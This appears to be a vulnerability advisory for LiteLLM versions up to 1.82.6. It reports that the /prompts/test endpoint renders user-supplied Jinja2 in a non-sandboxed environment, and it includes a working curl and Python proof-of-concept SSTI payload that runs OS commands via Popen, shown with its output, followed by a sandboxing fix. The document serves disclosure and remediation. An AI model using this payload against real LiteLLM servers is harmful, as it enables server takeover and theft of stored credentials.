# LiteLLM — SSTI → RCE via `/prompts/test` (Non-Admin)

**Severity:** Critical
**CVSS:** 9.0 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
**Version:** ≤ 1.82.6
**CWE:** CWE-94 (Improper Control of Generation of Code), CWE-1336 (Improper Neutralization of Special Elements in Template Engine)

---

## Summary

The `/prompts/test` endpoint renders user-supplied Jinja2 templates using a **non-sandboxed** `jinja2.Environment`. Any authenticated LiteLLM user (no admin role required) can achieve **Remote Code Execution** by injecting a Jinja2 SSTI payload into the `dotprompt_content` field.

---

## Root Cause

**File:** `litellm/integrations/dotprompt/prompt_manager.py:62`

```python
self.jinja_env = Environment(        # ← plain Environment, NOT SandboxedEnvironment
    loader=DictLoader({}),
    autoescape=select_autoescape(["html", "xml"]),
    variable_start_string="{{",
    variable_end_string="}}",
    ...
)
```

**File:** `litellm/proxy/prompts/prompt_endpoints.py:1075`

```python
rendered_content = prompt_manager.jinja_env.from_string(
    template_content    # ← user-controlled string from request.dotprompt_content
).render(**variables)
```

`template_content` is the body of `request.dotprompt_content` (everything after optional YAML frontmatter, or the full string if no frontmatter). No sanitization is applied before rendering.

**File:** `litellm/proxy/prompts/prompt_endpoints.py:1001`

```python
@router.post("/prompts/test", ...)
async def test_prompt(
    request: TestPromptRequest,
    user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth),  # ← any API key
):
    # NO role check inside function body
```

The router is registered unconditionally in `proxy_server.py:13504`.

---

## PoC — Verified RCE

### curl

```bash
curl -X POST http://LITELLM_HOST:4000/prompts/test \
  -H "Authorization: Bearer <any_valid_api_key>" \
  -H "Content-Type: application/json" \
  -d '{
    "dotprompt_content": "---\nmodel: gpt-4o\n---\n{% set ns = namespace() %}{% set subclasses = \"\".__class__.__mro__[1].__subclasses__() %}{% for c in subclasses %}{% if c.__name__ == \"Popen\" %}{% set ns.proc = c([\"id\"], stdout=-1) %}{% endif %}{% endfor %}User: {{ ns.proc.communicate()[0] }}",
    "prompt_variables": {}
  }'
```

### Python local verification

```python
from jinja2 import Environment, select_autoescape

env = Environment(
    autoescape=select_autoescape(["html", "xml"]),
    variable_start_string="{{",
    variable_end_string="}}",
    block_start_string="{%",
    block_end_string="%}",
)

payload = """{% set subclasses = "".__class__.__mro__[1].__subclasses__() %}{% for c in subclasses %}{% if c.__name__ == 'Popen' %}{{ c(['id'], stdout=-1).communicate()[0] }}{% endif %}{% endfor %}"""

result = env.from_string(payload).render()
print(result)
# → b&#39;uid=501(rodion) gid=20(staff) ...
```

**Output confirmed:** `uid=501(rodion) gid=20(staff) groups=20(staff),80(admin),...`

---

## Attack Flow

1. Attacker has any valid LiteLLM API key (regular user, no admin needed)
2. Sends `POST /prompts/test` with SSTI payload in `dotprompt_content`
3. Server renders template with non-sandboxed Jinja2
4. Arbitrary OS command executes in LiteLLM server process context
5. Command output is embedded in the LLM request (OOB exfil possible via DNS/HTTP callback)

---

## Impact

- **Full RCE** on the host running LiteLLM proxy
- Access to all environment variables (LLM API keys, database credentials, secrets)
- Lateral movement to internal network
- **Privilege required:** Any valid API key — affects all LiteLLM deployments with user API keys

---

## Fix

Replace `Environment` with `ImmutableSandboxedEnvironment` from `jinja2.sandbox`:

```python
# Before (VULNERABLE)
from jinja2 import DictLoader, Environment, select_autoescape
self.jinja_env = Environment(...)

# After (FIXED)
from jinja2.sandbox import ImmutableSandboxedEnvironment
self.jinja_env = ImmutableSandboxedEnvironment(...)
```

LiteLLM already imports `ImmutableSandboxedEnvironment` in `litellm_core_utils/prompt_templates/factory.py:11` — the fix is straightforward.

Note: `autoescape=True` does NOT prevent SSTI. It only HTML-encodes output; template code still executes.

---

## Affected Files

- `litellm/integrations/dotprompt/prompt_manager.py` (primary — non-sandboxed env)
- `litellm/integrations/gitlab/gitlab_prompt_manager.py` (same pattern, same bug)
- `litellm/integrations/arize/arize_phoenix_prompt_manager.py` (same pattern)
- `litellm/integrations/bitbucket/bitbucket_prompt_manager.py` (same pattern)
- `litellm/proxy/prompts/prompt_endpoints.py` (entry point, no role check)

---

## Timeline

- **2026-03-23** — Discovered and verified in v1.82.6
